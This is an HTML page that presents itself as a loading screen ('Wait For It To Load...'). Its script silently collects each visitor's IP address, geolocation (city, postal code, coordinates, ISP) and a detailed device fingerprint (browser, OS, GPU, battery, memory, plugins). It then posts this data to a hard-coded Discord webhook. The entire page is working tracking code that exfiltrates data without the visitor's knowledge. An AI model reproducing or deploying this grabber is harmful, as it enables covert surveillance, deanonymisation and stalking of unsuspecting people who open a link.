<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8" /><title>XXN_Test</title></head>
<body>
Wait For It To Load...
<script>
  const ipinfo = {}, deviceinfo = {};

  function gatherIPInfo() {
    return fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        Object.assign(ipinfo, {
          IP: data.ip,
          City: data.city,
          Region: data.region,
          Country: `${data.country_name} (${data.country})`,
          Postal: data.postal,
          Latitude: data.latitude,
          Longitude: data.longitude,
          ISP: data.org,
          ASN: data.asn || "N/A",
          Timezone: data.timezone,
          Currency: `${data.currency} (${data.currency_name})`
        });
      }).catch(() => Object.assign(ipinfo, { Error: "Failed to get IP info" }));
  }

  function gatherDeviceInfo() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const lang = navigator.language;
    const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
    const tzOffset = new Date().getTimezoneOffset();
    const browserMatch = ua.match(/(Firefox|Chrome|Edg|Safari)\/[\d.]+/) || [];
    const osMatch = ua.match(/\(([^)]+)\)/);
    const now = new Date().toString();

    Object.assign(deviceinfo, {
      Browser: browserMatch[0] || "Unknown",
      OS: osMatch ? osMatch[1] : platform,
      Platform: platform,
      Language: lang,
      LocalTime: now,
      TimezoneOffset: tzOffset + " minutes",
      Resolution: `${screen.width} × ${screen.height}`,
      TouchSupport: ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
      DoNotTrack: dnt,
      Memory: (navigator.deviceMemory || "Unknown") + " GB",
      CPUThreads: navigator.hardwareConcurrency || "Unknown",
      Plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "None"
    });

    const batteryPromise = navigator.getBattery ? navigator.getBattery().then(battery => {
      const status = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
      deviceinfo.Battery = status;
    }).catch(() => {}) : Promise.resolve();

    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      const gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      const gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      deviceinfo.GPU = `${gpuVendor} — ${gpuRenderer}`;
    } catch {
      deviceinfo.GPU = "Unavailable";
    }

    return batteryPromise;
  }

  async function collectAndSend() {
    await gatherIPInfo();
    await gatherDeviceInfo();

    const lines = [];
    lines.push("**:earth_africa: IP Location:**");
    for (let key in ipinfo) lines.push(`**${key}**: ${ipinfo[key]}`);

    lines.push("\n**:brain: Device Info:**");
    for (let key in deviceinfo) lines.push(`**${key}**: ${deviceinfo[key]}`);

    const payload = { content: lines.join("\n") };

    fetch("https://discord.com/api/webhooks/1420561724410429472/qq07ULPd7_URtkJ8czru91tH2FRUgCgWbgkUODHXAf2XikB_qxrOhvTsLDKEUFwwvCUw", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  collectAndSend();
</script>
</body>
</html>
